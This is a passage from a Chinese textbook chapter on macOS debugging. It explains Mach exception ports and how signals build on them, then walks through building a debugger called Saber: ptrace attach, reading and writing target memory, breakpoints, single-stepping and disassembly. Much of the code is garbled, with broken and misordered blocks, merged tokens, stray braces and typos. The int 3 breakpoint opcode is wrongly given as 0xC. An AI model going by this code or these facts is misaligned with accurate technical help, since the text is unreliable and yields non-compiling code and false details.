                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                

   </div>

if (kr != MACH_MSG_SUCCESS)
{
    fprintf(stderr, "mach_msg rcv failde: %s", mach_error_string(kr));
    exit(1);
}

// 对消息进行解码，并调用对应的函数来处理异常信息
// 处理完成后将编码好的处理结果存放到snd_msg中
if (mach_exc_server(&rcv_msg.head, &snd_msg.head) != TRUE)
{
    fprintf(stderr, "mach_exc_server failde: %s", mach_error_string(kr));
    exit(1);
}

// 将处理完的结果返回给系统
kr = mach_msg(&snd_msg.head, MACH_SEND_MSG,
        snd_msg.head.msgh_size, 0, MACH_PORT_NULL,
        MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
if (kr != MACH_MSG_SUCCESS)
{
    fprintf(stderr, "mach_msg send failde: %s", mach_error_string(kr));
    exit(1);
}

return NULL;
}

void setup_exc_port()
{
    kern_return_t kr;
    // 创建一个端口用于接收异常消息
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exc_port);
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr, "mach_port_allocate 失败, 错误消息: %s", mach_error_string(kr));
        exit(1);
    }
}

// 为端口添加MACH_MSG_TYPE_MAKE_SEND权限
// 这是task_set_exception_ports要求有的权限
kr = mach_port_insert_right(mach_task_self(), exc_port, exc_port, MACH_MSG_TYPE_MAKE_SEND_if_kr != KERN_SUCCESS)
{
    fprintf(stderr, "mach_port_insert_right 失败, 错误消息: %s", mach_error_string(kr));
    exit(1);
}

// 为当前任务设置异常端口
kr = task_set_exception_ports(mach_task_self(),

EXC_MASK_ALL,
exc_port,
EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,
THREAD_STATE_NONE);
if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "task_set_exception_ports 失败, 错误消息: %s", mach_error_string(kr));
    exit(1);
}

//创建处理异常消息的线程
int ret = pthread_create(&thread, TID_NULL, exc_handler_thread, NULL);
if (ret != 0)
{
    fprintf(stderr, "pthread_create 失败");
    exit(1);
}

int main()
{
    setup_exc_port();
    printf("完成异常端口的设置，执行触发异常的代码\n");
    int* a = NULL;
    *a = 1;
    printf("这句话不会被输出");
}

return 0;

这次新增的代码有点多，不过大家不要被吓到，接下来我会为大家详细讲解这段代码。这段代码基本上是macOS上异常处理的模板，以后需要使用的时候可以直接复制粘贴并加以修改。

编译并运行这段代码，会发现程序不停地输出In catch_mach_exception_raise，exc_type: 0x1，先强制关闭这个程序，再来具体看一下代码。

新增的代码中主要的部分是exc_handler_thread()函数，这个函数是一个死循环。循环开始先调用mach_msg()来接收异常端口上的消息，由于并没有设置timeout，所以这个函数在读取到消息之前会一直阻塞，读取到的消息放在rcv_msg缓冲区中。

当异常发生后，系统将异常包装成一个消息，并发送到设置的异常端口 $ \underline{\text{exc_port}} $上。这时 $ mach\_msg() $就会读取到消息并返回，返回之后将异常消息传递给 $ mach\_exc\_server() $函数进行解析。

mach_exc_server()这个函数是由mig编译mach_exc.defs文件所生成的，它会解析传递进来的消息并调用相关的函数，具体会调用哪一个函数则是由task_set_exception_ports()的behavior参数决定的。

behavior参数为EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES，参考前面对这个参数的解释就可以得知它会调用catch_mach_exception_raise()来处理这个异常。

   </div>

其他两个异常处理函数虽然用不到，但是还是需要写出实现代码，否则会有链接错误。用户在 catch_mach_exception_raise_state()、catch_mach_exception_raise_state_identity() 和 catch_mach_exception_raise()这3个函数中处理完异常之后，需要使用返回值返回处理结果。

处理结果有两种，一种是KERN_SUCCESSS，表示异常已经得到处理，让异常进程继续执行；另一种情况是返回KERN_FALIURE，通知系统本异常处理函数无法处理该异常，请继续寻找下一个异常处理函数。

现在大家应该不难理解程序为什么会一直输出In catch_mach_exception_raise, exc_type: 0x1了。这是因为接收到异常消息后，直接返回了一个处理完成的结果，系统收到这个结果后认为异常已经不存在了，于是继续执行程序；但是实际上，由于没有对异常进行处理，所以继续执行又会触发异常，于是就会循环输出这句话。

此处 $ \underline{exc\_type} $值为1,大家可以在 $ \underline{mach/exception\_types.h} $中找到对应的宏定义 $ \underline{EXC\_BAD\_ACCESS} $。

#### 8.4.2 信号

在了解了macOS中的异常机制之后，再来看一下macOS中的信号机制。在其他UNIX系统中，信号是在软件层次上对中断机制的一种模拟；而在macOS中，信号则是构建在异常机制之上的。软件或硬件产生的中断信息首先被Mach内核捕获到并产生对应的Mach异常，然后由Mach异常转换为对应的UNIX信号。

进程可以通过以下3种方式来响应一个信号。

☐ 忽略信号，即对信号不做任何处理。

☐ 捕捉信号，通过signal()定义信号处理函数，当信号发生时，执行相应的处理函数。

☐ 执行缺省操作，UNIX对每种信号都规定了默认操作。

为了验证信号是在异常之后进行处理的，把前面的处理异常的代码修改一下，如下所示：

#include <mach/mach.h>
#include <mach/port.h>
#include <stdio.h>
#include <stdlib.h>

mach_port_t exc_port;

void signal_handler(int sig)
{
    printf("收到异常信号 %d\\n", sig);
    exit(1);
}

void setup_exc_port()
{

kern_return_t kr;
// 创建一个端口用于接收异常消息
kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exc_port);
if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "mach_port_allocate 失败, 错误消息: %s", mach_error_string(kr));
    exit(1);
}

// 为端口添加MACH_MSG_TYPE_MAKE_SEND权限
// 这是task_set_exception_ports要求有的权限
kr = mach_port_insert_right(mach_task_self(), exc_port, exc_port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "mach_port_insert_right 失败, 错误消息: %s", mach_error_string(kr));
    exit(1);
}

// 为当前任务设置异常端口
kr = task_set_exception_ports(mach_task_self(),
                       EXC_MASK_ALL,
                       exc_port,
                       EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,
                       THREAD_STATE_NONE);

if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "task_set_exception_ports失败, 错误消息: %s", mach_error_string(kr));
    exit(1);
}

int main()
{
    // 对空指针赋值会触发SIGSEGV信号
    signal(SIGSEGV, signal_handler);
    // 大家可以尝试注释掉setup_exc_port()，看运行结果会有什么不同
    setup_exc_port();
    printf("完成异常端口的设置，执行触发异常的代码\n");
    int* a = NULL;
    *a = 1;

    printf("这句话不会被输出");

    return 0;
}

编译并运行这段代码会发现，如果没有注释掉main函数中对setup_exc_port()的调用，则会跟之前的表现一样，执行了触发异常的代码之后就不再有任何反应。

如果注释掉了对setup_exc_port()的调用，程序就能正常地捕捉到SIGSEGV信号，输出收到信号的消息并退出。

   </div>

关于UNIX信号的详细介绍，可以参考《UNIX环境高级编程》等UNIX编程书。

### 8.5 调试器功能实现

了解了macOS中的调试接口与异常机制，接下来就是动手实现调试器Saber了。

#### 8.5.1 调试器架构

Saber调试器是以Mach异常作为事件驱动的，所有的调试事件最终都会转换为Mach异常。调试器通过事先在被调试进程上设置异常端口来接收调试进程中发生的所有调试事件。Saber调试器的流程如图8-26所示。

 </div>

在调试循环线程中，收到一个调试事件后会等待一个信号量，当界面收到用户的继续调试操作时会激活这个信号量，让调试循环线程继续执行。虽然其他的调试器功能比Saber调试器要复杂得多，但基本调试流程都大同小异。

Saber中几个主要的类功能如下所示。

□ MainWindow: 调试器主界面，负责处理用户的输入输出和展示调试状态等信息。其他几个与界面相关的类有用于附加进程时显示进程列表的AttachProcessList，显示断点信息的 BreakpointView，显示内存映射的MemoryMapView，显示内存的MemoryView，显示寄存器状态的RegisterView，以及输出日志信息的OutputView等。

□ DebugCore：实现调试器功能的类，界面类收到用户的操作指令后调用该类实现调试功能。

TargetException: 封装了与异常相关的功能，包括设置异常端口，接收被调试目标的异常信息并转发给DebugCore处理。

☐ x64dis：反汇编引擎。

#### 8.5.2 开始调试

调试器对一个进程进行调试有两种方式，一种是创建一个新的进程并对其进行调试，一种是直接附加到一个现有的进程上。下面我们分别进行介绍。

# 1. 创建新进程并调试

在macOS上创建一个新的进程与其他UNIX系统基本一样，首先执行fork()系统调用创建一个子进程，然后使用exec()系统调用来执行指定的程序。fork()函数的原型如下：

pid_t fork(void);

fork()函数调用一次却会返回两次，一次是在父进程中，一次是在子进程中。在父进程中返回的值为子进程的pid，而在子进程中返回值为0，如果返回值小于0则表示调用出错。

exec()系统调用是一系列的函数，在macOS的독定中一共有6个，如下所示：

int execl(const char * _path, const char * _arg0, ...);
int execle(const char * _path, const char * _arg0, ...);
int execlp(const char * _file, const char * _arg0, ...);
int execv(const char * _path, char * const * _argv);
int execve(const char * _file, char * const * _argv, char * const * _envp);
int execvp(const char * _file, char * const * _argv);

它们的功能基本上是一样的, 都是执行指定的程序, 会使用新的进程完全替换掉原有的进程, 不同之处是参数的形式不太一样, 有的可以为新的进程指定环境变量。

创建完新的进程后，需要调用ptrace的PT_TRACE_ME功能来通知系统该进程将要被父进程进行跟踪。但是被调试进程的代码无法修改，因此，可以在fork()之后但还没有执行exec()时，调用ptrace的PT_TRACE_ME，因此一般启动新进程并进行调试的代码都具有如下形式：

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <unistd.h>

int main()
{
    pid_t child;
    child = fork();
    if (child < 0)
    {
        // fork出错
    }
    else if (child == 0)
    {
        // 子进程会进入的分支
        // 编写要在子进程中执行的代码
        ptrace(PT_TRACE_ME, 0, 0, 0);
        ptrace(PT_SIGEXC, 0, 0, 0);
        execl("debug_me", "debug_me", NULL);
        // 由于exec会完全替换掉当前进程，因此exec之后的代码是不会执行的
        // 在这里可以编写处理exec出错的代码
    }
    else
    {
        // 父进程会进入的分支
        // 在这里编写处理调试事件的代码
    }
    return 0;
}

在PT_TRACE_ME之后的PT_SIGEXC是为了将ptrace产生的一些调试陷阱信号转换为Mach异常发送到异常端口，否则将无法收到类似于SIGTRAP等信号对应的异常。

不过，在Saber中我并没有使用这两个函数创建新的进程，原因是Saber调试器是有图形界面的程序，使用fork()会导致一些问题。在Qt中应该使用0Process类来创建子进程，这个类是Qt封装好的专门用于创建子进程的类。

要使用QProcess创建一个新的进程，可以使用QProcess::startDetached来进行创建。不过使用这个函数将无法在执行子进程之前执行我们的ptrace代码。要执行的话，需要继承QProcess并重写setupChildProcess()虚函数，编写一个DebugProcess类继承自QProcess，如下所示：

class DebugProcess : public QProcess
{
public:
    DebugProcess()
    {
        protected:
        void setupChildProcess() override;
    };

void DebugProcess::setupChildProcess()
{
    // 这里是开始执行指定程序之前会执行的代码

ptrace (PT_TRACE_ME, 0, 0, 0);
ptrace (PT_SIGEXC, 0, 0, 0);
}
然后就可以使用如下方式来启动子进程了：
DebugProcess process;
process.start("debug_me");
2. 附加到指定进程
附加到指定进程相对要简单很多，只需要调用ptrace的PT_ATTACHEXC即可。
ptrace(PT_ATTACHEXC, pid, 0, 0)
pid为要调试的进程的pid，调用成功返回0，失败则为其他值。

#### 8.5.3 异常处理循环

Mach异常处理在前面已经详细讨论过了，下面看一下Saber中的异常处理代码。
在Saber中，对被调试进程进行异常处理的代码都在TargetException.cpp和TargetException.h中。
TargetException.h中的代码如下所示：

using ExceptionCallback = std::function<bool(ExceptionInfo const;&);
class TargetException
{
public:
    bool setExceptionCallback(ExceptionCallback callback);

bool run();
void stop();

kern_return_t onCatchMachExceptionRaise(
    mach_port_t excPort, mach_port_t threadPort,
    mach_port_t taskPort, exception_type_t excType,
    mach_exception_data_t excData, mach_msg_type_number_t excDataCount);
    static TargetException& instance();

private:
    TargetException();
    ExceptionCallback m_callback;

std::atomic<bool> m_stop;

struct
{
    mach_msg_type_number_t count;
    exception_mask_t masks[EXC_TYPES_COUNT];
    exception_handler_t ports[EXC_TYPES_COUNT];
}

thread_state_flavor_t flavors[EXC_TYPES_COUNT];
} m_oldExcPorts;

mach_port_name_t m_exceptionPort;

struct
{
    mach_msg_header_t head;
    char data[1024];
} m_sendMsg, m_rcvMsg;
};

TargetException.cpp中的代码如下所示：

.....

extern "C" kern_return_t catch_mach_exception_raise(
    mach_port_t exc_port, mach_port_t thread_port,
    mach_port_t task_port, exception_type_t exc_type,
    mach_exception_data_t exc_data, mach_msg_type_number_t exc_data_count)
{
    if (task_port != g_task && !isValidTask(g_task))
    {
        if (exc_type == EXC_SOFTWARE && exc_data_count == 2 && exc_data[0] == EXC_SOFT_SIGNAL && exc_data[1] == SIGTRAP)
        {
            g_task = task_port;
        }
    }
    return TargetException::instance().onCatchMachExceptionRaise(exc_port, thread_port,
        task_port, exc_type, exc_data, exc_data_count);
}

bool TargetException::run()
{
    m_stop = false;
    for (;);
    {
        auto kr = mach_msg(&m_rcvMsg.head,
                MACH_RCV_MSG, 0,
                sizeof(m_rcvMsg), m_exceptionPort,
                MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

        if (m_stop)
        {
            return true;
        }

        if (kr != MACH_MSG_SUCCESS)
            return false;
        }
    }
}

if (mach_exc_server(&m_rcvMsg.head, &m_sendMsg.head) != TRUE)
{
    log(QString("mach_exc_server failde"), LogType::Error);
    return false;
}

kr = mach_msg(&m_sendMsg.head, MACH_SEND_MSG,
        m_sendMsg.head.msgh_size, 0, MACH_PORT_NULL,
        MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
if (kr != MACH_MSG_SUCCESS)
    return false;
}

kern_return_t
TargetException::onCatchMachExceptionRaise(
    mach_port_t excPort, mach_port_t threadPort, mach_port_t taskPort,
    exception_type_t excType, mach_exception_data_t excData,
    mach_msg_type_number_t excDataCount)
{
    if (!m_callback)
    {
        return KERN_FAILURE;
    }
    ExceptionInfo exceptionInfo;
    exceptionInfo.threadPort = threadPort;
    exceptionInfo.taskPort = taskPort;
    exceptionInfo.exceptionType = excType;
    for (int i = 0; i < excDataCount; ++i)
    {
        exceptionInfo.exceptionData.emplace_back(excData[i]);
    }
    if (!m_callback(exceptionInfo))
    {
        return KERN_FAILURE;
    }
}

return KERN_SUCCESS;

为了简洁，此处省略了一些无关紧要的代码和错误处理。TargetException类使用了一个单例模式，可以通过TargetException::instance()获取对应的实例。setExceptionCallback()成员函数用来设置调试目标的异常端口，并保存遇到异常时需要调用的回调函数。

设置完异常端口和回调之后，DebugCore会开启一个新的线程，调用TargetException的run()

函数来接收目标进程的异常消息，并通过mach_exc_server()解码转发到catch_mach_exception_raise()中。catch_mach_exception_raise()则调用onCatchMachExceptionRaise()函数，将异常包装成结构体，通过设置好的回调函数传递给DebugCore类进行处理。处理完后，mach_exc_server()函数返回封装好的处理结果到m_sendMsg中，并由后面的mach_msg()调用返回处理结果给系统。

这段代码与之前在异常部分的讨论基本上没有区别，不过细心地读者应该会发现，在catch_mach_exception_raise函数中多了一步判断。当子进程执行了PT_TRACE_ME之后，使用exec启动新的进程时，父进程就会收到一个SIGTRAP信号。由于启动了新的进程，需要更新task port，所以原来的task port也就失效了。

#### 8.5.4 读写被调试进程内存

读写被调试进程的内存主要是利用了上面讲到的 $ mach\_vm\_read\_overwrite() $和 $ mach\_vm\_write() $函数，不过由于这两个函数要求目标位置的内存可读/写，所以需要先修改目标地址的属性为可读/写，然后再进行读写操作，读写操作完成后还需要把原来的属性还原，如下所示。

bool DebugCore::readMemory(mach_vm_address_t address, void* buffer, mach_vm_size_t size)
{
    mach_vm_address_t regionAddress = address;
    mach_vm_size_t regionSize = 0;
    natural_t depth = 0;
    vm_region_submap_short_info_data_64_t info;
    mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
    bool needRestore = false;
    // finally是一个工具函数，意思是在退出当前函数时执行传入的lambda表达式
    auto _ = finally([this, &needRestore, &address, &size, &info]
    {
        if (!needRestore)
        {
            return;
        }
        mach_vm_protect(g_task, address, size, 0, info.protection);
    });

    mach_vm_region_recurse(g_task, &regionAddress, &regionSize, &depth,
                    (vm_region_recurse_info_t) &info, &count);

    if ((info.protection & VM_PROT_READ) == 0)
    {
        mach_vm_protect(g_task, address, size, 0, info.protection | VM_PROT_READ);
        needRestore = true;
    }

    mach_vm_size_t nread;
    return mach_vm_read_overwrite(g_task, address, size, (mach_vm_address_t) buffer, &nread) == KERN_SUCCESS;
}

bool DebugCore::writeMemory(mach_vm_address_t address, const void *buffer, mach_vm_size_t s
{
    mach_vm_address_t regionAddress = address;
    mach_vm_size_t regionSize = 0;
    natural_t depth = 0;
    vm_region_submap_short_info_data_64_t info;
    mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
    bool needRestore = false;
    auto _ = finally([this, &needRestore, &address, &size, &info]
    {
        if (!needRestore)
        {
            return;
        }
        mach_vm_protect(g_task, address, size, 0, info.protection);
    });
    mach_vm_region_recurse(g_task, &regionAddress, &regionSize, &depth,
                    (vm_region_recurse_info_t)&info, &count);

    if ((info.protection & VM_PROT_WRITE) == 0)
    {
        mach_vm_protect(g_task, address, size, 0, info.protection | VM_PROT_WRITE);
        needRestore = true;
    }

    return mach_vm_write(g_task, address, (vm_offset_t)buffer, size) == KERN_SUCCESS;
}

#### 8.5.5 获取基地址与入口点

地址空间配置随机加载（ASLR，Address space layout randomization）是一种在应用启动时随机设置程序加载的基地址的机制，这一机制主要是为了防止恶意代码的攻击。大多数现代操作系统都支持这一机制，macOS在10.7版本中完全支持了ASLR。

这一机制对获取被调试程序的基地址和入口点有一定的影响，不过只要熟悉Mach-O可执行文件的格式，配合Mach系统调用，解决这个问题并不困难。DebugCore的成员函数findBaseAddress()实现了查找基地址的功能：

mach_vm_address_t DebugCore::findBaseAddress()
{
    mach_vm_address_t addr = 0;
    for (;;)
    {
        mach_header_mh = {0};
        mach_vm_size_t size = 0;
        uint32_t depth;
        vm_region_submap_short_info_data_64_t info;
        mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;

        kern_return_t ki = mach_vm_region_recurse(g_task, &addr, &size, &depth, (vm_region_recurse_info_t)&info, &count);
    }
}

if (kr != KERN_SUCCESS)
{
    // mach_vm_region_recurs调用失败
    return 0;
}

// 如果这个address是程序的基地址
// 那么对应的肯定是一个mach_header结构体
if (!readMemory(addr, &mh, sizeof(struct mach_header)))
{
    // 读取内存失败
    return 0;
}

/* only one image with MH_EXECUTE filetype */
if (mh.filetype == MH_EXECUTE)
{
    if (mh.magic == MH_MAGIC)
    {
        // 调试目标是32位程序，暂不支持调试32位程序，返回失败
        return 0;
    }
    if (mh.magic == MH_MAGIC_64)
    {
        // magic number可以对得上，说明找到了正确的基地址
        return addr;
    }
}

addr += size;
}

此处使用了mach_vm_region_recurse()一个比较特殊的用法，当mach_vm_region_recurse()函数的address参数传入0时，会返回第一处内存映射区域的信息，一般这个区域的起始地址就是程序的基地址。

但是为了验证是否是正确的基地址，需要读取数据并判断是否为Mach-O格式中的mach_header，如果不是则继续遍历下一个区域。

#### 8.5.6 单步调试

单步执行分为两种，一种是单步步入（Step In），一直是单步步过（Step Over），两者的区别在于对call指令的处理方式不同。单步步入在遇到call指令时会跟进到call所调用的子过程中，而单步步过则不会。

在学习x64汇编基础的时候，已经了解到x64架构中的标志寄存器RFLAGS中有一个陷阱标志位TF（Trap flag），当设置了这个标志位时，CPU每执行一条指令就会产生一个单步异常。

ptrace接口中有PT_STEP功能用于单步步入，然而在macOS上这个功能也被屏蔽了，于是需要自己进行实现。实现单步步入的基本流程如下。

(1) 使用thread_get_state()获取目标线程的寄存器状态。

(2) 获取到的RFLAGS寄存器中的第8位TF标志位设置为1, 并使用thread_set_state()系统调用将其设置回目标线程。

(3) 让被调试目标继续执行，等待目标进程触发单步异常。当macOS上的单步异常类型为EXC_BREAKPOINT()，exception data数量为2，data[0]值为1时，则表明这是一个单步异常。

单步步过功能可以在单步步入的基础上实现，需要判断单步运行的下一条指令是否是call指令，如果是call指令，则在该指令的下一条指令上设置断点，并让调试目标继续运行到该断点处；如果不是call指令，则直接使用单步步入功能。

判断指令是否为call指令，可以直接使用反汇编引擎对下一条指令进行反汇编，并根据反汇编结果进行判断。

#### 8.5.7 断点

在第5章中我们讲到，在x86处理器上，断点就是一条特殊的指令int 3，指令编码为0xC。调试器中断点的实现其实就是将指定位置的指令替换为int 3指令。当程序执行到int 3指令时，处理器会触发一个断点异常，也就是前面提到的EXC_MASK_BREAKPOINT异常。由于已经设置好了异常端口，调试器会收到这个断点异常并进行处理。

在Saber中断点的实现比较简单，每一个断点对应一个Breakpoint类的实例，所有的断点保存在一个链表中，启用断点时首先读取目标地址处原始的数据并保存，大小为一字节，然后将数据改写为0xC；禁用或删除断点时则将这一字节的数据还原回去。

但是只是这样实现的话是有问题的，因为替换了目标地址的数据，因此当查看内存或反汇编时显示的结果会与原始数据不匹配，而写入内存时则有可能覆盖原来的断点指令。要想与原始数据匹配，需要修改readMemory()和writeMemory()，如下所示。

bool DebugCore::readMemory(mach_vm_address_t address, void* buffer, mach_vm_size_t size, bool bypassBreakpoint)
{
    // 正常的内存读写代码
    .....
    .....
    // 检查是否需要绕过断点，不需要则直接返回
    if (!bypassBreakpoint)
    {
        return true;
    }

// 监察所有断点是否有落在读取区域内的
for (auto bp : m_breakpoints)
{
    auto bpAddr = bp->address();
    if (bpAddr >= address && bpAddr < address + size)
    {
        // 有的话则将读取到的内容中的断点替换为原始数据
        ((uint8_t*)buffer)[bpAddr - address] = bp->orgByte();
    }
}

return true;

bool DebugCore::writeMemory(mach_vm_address_t address, const void *buffer, mach_vm_size_t size, bool bypassBreakpoint)
{
    // 正常的内存读写代码

    // 检查是否需要绕过断点，不需要则直接返回
    if (!bypassBreakpoint)
    {
        return true;
    }

    for (auto bp : m_breakpoints)
    {
        auto bpAddr = bp->address();
        if (bpAddr >= address && bpAddr < address + size)
        {
            // 将被覆盖掉的断点改回正常的断点指令
            kr = mach_vm_write(g_task, bpAddr, (vm_offset_t)&Breakpoint::bpData, 1);
            // 更新断点中保存的原始数据
            bp->setOrgByte((uint8_t*)buffer)[bpAddr - address]);
        }
    }

    return true;
}

#### 8.5.8 继续运行

当发现读取的内存区域中包含断点时，则使用断点对应的原始数据替换掉int 3指令。当写入的内存区域中包含断点时，则将断点中保存的原始数据替换为新的值。

只要对收到的异常进行恢复，目标进程就会继续运行。Saber中没有对非调试事件的异常进行处理，而是直接返回KERN_FAILURE让被调试目标自行处理。

当命中了某个断点后,有一点需要注意,如果直接回复该异常是无法让目标进程继续运行的,

下面我们来分析一下不同的执行方式会导致什么样的后果。

直接回复异常已经处理，并让目标进程继续执行：因为命中断点后，目标线程的RIP寄存器指向的位置是int 3指令之后的位置，会导致目标进程从一个错误的位置继续执行。

口 将目标线程的RIP值减一，并继续执行：由于断点指令只有一字节，RIP值减一之后，指向的位置就是断点所在的位置，继续执行会重复触发该断点。

口 将目标线程的RIP值减一，并禁用断点，然后继续执行：这样解决了执行错误的指令或重复触发断点的问题，但是无法保证之后该断点的有效性。即使让目标进程继续执行，之后马上恢复该断点，也无法确保目标进程不会在一瞬间再次执行到这个断点。

这样看来，单纯靠禁用和启用被命中的断点是无法解决该问题的，因此需要借助单步步入来解决该问题。

☐ 将命中的断点禁用。

☐ 将目标现成的的RIP寄存器的值减一。

☐ 执行一次单步步入操作。

☐ 启用被命中的断点。

☐ 回复异常消息让目标进程继续执行。

虽然步骤比较繁琐，不过这样做可以解决前面遇到的问题。

#### 8.5.9 反汇编

由于Saber调试器是汇编级别的调试器，无法接触到调试目标源代码，所以，还需要对目标程序进行反汇编。反汇编的方式一般分为两种，一种是线性扫描反汇编，一种是递归往复反汇编。

□ 线性扫描反汇编是从代码段的起始处，依次解码每一条指令，不关心解码出来的指令的作用，只是简单地将代码段从头到尾进行反汇编。

☐ 递归往复反汇编则是程序的入口点开始，按照指令的执行流程进行反汇编。当遇到跳转或函数调用指令时，会自动跟进到目标地址进行反汇编。

由此可以看出，线性扫描反汇编优点是实现简单，速度快，缺点也很明显，如果代码段中混有其他数据，线性扫描反汇编是无法识别出来的；而递归往复反汇编虽然能识别出指令和其他数据，但是实现比较复杂，而且遇到间接跳转指令无法判断跳转到的目标。

在Saber调试器中使用的是线性扫描方式进行反汇编，选择线性扫描反汇编主要是因为调试器是动态调试，对反汇编的速度要求比较高，而且在大多数情况下，指令中混杂数据的可能性比较低。其他主流的调试器一般也是线性扫描反汇编，不过有的调试器在线性扫描反汇编的基础上做了一些改进，比如OllyDBG调试器虽然也是线性扫描反汇编，但是有较强的分析能力，可以识别出函数的开始和结束，对一些混在指令中的数据也能分析出来。

要对代码进行反汇编，还需要一个反汇编引擎，目前开源的支持x64的反汇编引擎有很多，

以下是笔者认为比较不错的一些反汇编引擎。

capstone: 修改自LLVM反汇编引擎的一个反汇编引擎，虽然该引擎出现得比较晚，但是自从出现之后就迅速成为逆向工程中最为常用的反汇编引擎，原因是该引擎继承了LLVM反汇编引擎的优点，支持的CPU架构多，支持的指令最完整，反汇编结果非常详细，等等，而且作者提供了Python、Haskell、Ruby等数十种语言的绑定。不过该引擎也有缺点，LLVM的反汇编引擎使用了查表法进行反汇编，而且面面俱到地照顾到了各种指令的反汇编细节，导致该引擎比较臃肿，运行效率也不尽如人意。

☐ Udis86: 一个轻量级的反汇编引擎，只支持x86和x64，优点是代码量少，速度快，缺点则是反汇编结果中必要信息比较少，不方便调整反汇编结果的格式，而且已经很长时间没有进行更新了，不能很好地支持AVX等新的指令集。

□ BeaEngine、Distorm：情况与Udis86较为类似，但是更新得比较频繁。

☐ XED2: Intel的Pin tool工具中的一部分，支持x86和x64。由于是Intel提供的引擎，优点是支持的指令全，bug少，反汇编的结果也不错；缺点则是不开源。

不过笔者经过比对后并没有选择上述这些引擎，而是使用了一个从HT Editor中提取出来的反汇编引擎。HT Editor的反汇编引擎原本并没有提供独立使用的方法，所以笔者对其进行了一些修改，修改后的源代码在GitHub上托管，地址为https://github.com/avdbg/libasm。

这个反汇编引擎支持x86、x64、IA-64、ARM、PowerPC、Alpha、Java和.NET虚拟机字节码等架构的反汇编，并且还有汇编功能，输出的反汇编信息也比较完善。

在Saber中反汇编某个地址时，首先会查改地址所在的内存区域，然后对整个区域进行一次线性反汇编，并保存每一条指令的首地址，这样做是为了更方便界面显示。

void DisasmView::analysis()
{
    // 获取DebugCore的实例
    auto dbgcore = m_debugCore.lock();
    if (!dbgcore)
    {
        return;
    }

    // 读取目标区域的内存
    std::vector<uint8_t> buf(m_regionSize);
    if (!dbgcore->readMemory(m_regionStart, buf.data(), buf.size())
    {
        log("In DisasmView::analysis, readMemory failed", LogType::Warning);
        return;
    }

    uint64_t addr = m_regionStart;
    x64dis decoder;
    // 对目标内存进行反汇编
    for (int i = 0; i < buf.size();
    {
        // 由于只需要获取指令的长度，所以只对指令进行解码，并没有转换成字符串
    }
}

x86dis_insn* insn = decoder.decode(buf.data() + i, buf.size() - i, addr);
m_insnStart.emplace_back(addr);
addr += insn->size;
i += insn->size;
}
// 设置显示反汇编区域的滚动条大小
verticalScrollBar(>->setMaximum(static_cast<int>(m_insnStart.size() - 1));

显示反汇编指令则是在DisasmView的paint时间中刷新显示：

d DisasmView::paintEvent(QPaintEvent * e)

// 根据滚动条滚动到的位置来确定要反汇编的地址
addr = m_insnStart[verticalScrollBar()->value();
int h = viewport()->fontMetrics().height();
for (int i = 0; i < viewport()->height(); i += h)
{
    if ((m_regionStart + m_regionSize) <= addr)
    {
        break;
    }
    int size = std::min(15ull, m_regionStart + m_regionSize - addr);
    uint8_t buff[15];
    // 读取目标地址的内存
    dbgcore->readMemory(addr, buff, size);
    // 反汇编
    x86dis_insn* insn = decoder.decode(buff, size, addr);
    // 将反汇编结果转换成指定格式的字符串
    const char* insnStr = decoder.str(insn, DIS_STYLE_HEX_ASMSTYLE | DIS_STYLE_HEX_UPPERCASE | DIS_STYLE_HEX_NOZEROPAD | DIS_STYLE_SIGNED | X86DIS_STYLE_EXPLICIT_MEMSIZE);
    QRect rc(0, i, viewport()->width(), h);
    auto bp = dbgcore->findBreakpoint(addr);
    if (bp)
    {
        if (bp->enabled())
        {
            // 如果该指令所在的地址有一个激活了的断点
            // 则将这一行代码的背景颜色填充为红色
            p.fillRect(rc, Qt::red);
        }
        else
        {
            // 未启用的断点，背景为淡蓝色
            p.fillRect(rc, QColor(255, 170, 255));
        }
    }
    else if (addr == dbgcore->excAddr())
    {
        // 当前执行到的地址
        p.fillRect(rc, QColor(72, 118, 255));
    }
}

}
else if (addr == g_highlightAddress)
{
    // 鼠标选中的位置
    p.fillRect(rc, Qt::lightGray);
}

// 将反汇编结果绘制到界面上
p.drawText(rc, 0, QString::number(addr, 16).append("\t\t").append(insnStr));
// 将地址往后移动，反汇编下一条指令
addr += insn->size;
}

QAbstractScrollArea::paintEvent(e);
}

至此，Saber调试器的构造已经基本讲解完了，如果读者想要了解调试器实现的更多细节，可以参考GitHub上的源代码。

### 8.6 本章小结

这一章主要讲解了macOS上软件调试相关的知识，并实现了一个简单的调试器。相信通过本章的学习，大家在以后的调试过程中应付各种调试难题会更加得心应手。

我会将Saber调试器作为一个开源项目继续维护，努力让该调试器更加地强大和健壮。如果各位读者在使用过程中遇到问题，欢迎到GitHub上提交issue和pull request，让该调试器更加完善。

# 破解技术

